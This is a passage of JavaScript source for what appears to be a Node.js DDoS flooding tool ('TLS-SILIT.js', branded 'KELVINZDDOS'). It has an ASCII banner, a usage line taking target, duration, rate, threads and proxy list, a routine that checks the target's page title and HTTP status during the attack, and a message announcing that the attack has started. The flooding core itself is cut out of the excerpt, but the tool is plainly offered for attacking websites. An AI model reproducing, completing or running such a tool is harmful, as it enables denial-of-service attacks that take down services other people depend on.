...
⠀⠀⠀⠀⠀⠀⢸⠃⢻⡏⢸⣷⠀⠀⠀⠀⠀⣸⡇⠀⠀⠻⢿⡅⠀⣶⣿⣶⣴⣿⣤⣽⣾⣾⣿⣿⡟⣿⡀⠀⠀
╭────────────────────────────────────╮
      DDOSPANPANEL |KONTOL|  KELVINZMODZ        
╰────────────────────────────────────╯
`);
 console.log(`node TLS-SILIT.js [TARGET] [TIME] [RATE] [THREAD] [PROXY]`); process.exit();}
 const headers = {};
 ...
 const getCurrentTime = () => {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      ...
      console.log(`[\x1b[35mKELVINZDDOS\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === 'Request timed out') {
        console.log(`[\x1b[35mKELVINZDDOS\x1b[0m] ${getCurrentTime()} Request Timed Out`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`[\x1b[35mKELVINZDDOS\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
      } else {
        console.log(`[\x1b[35mKELVINZDDOS\x1b[0m] ${getCurrentTime()} ${error.message}`);
      }
    });
}
...
`);
  ...
  console.log(`[\x1b[35mKELVINZDDOS\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
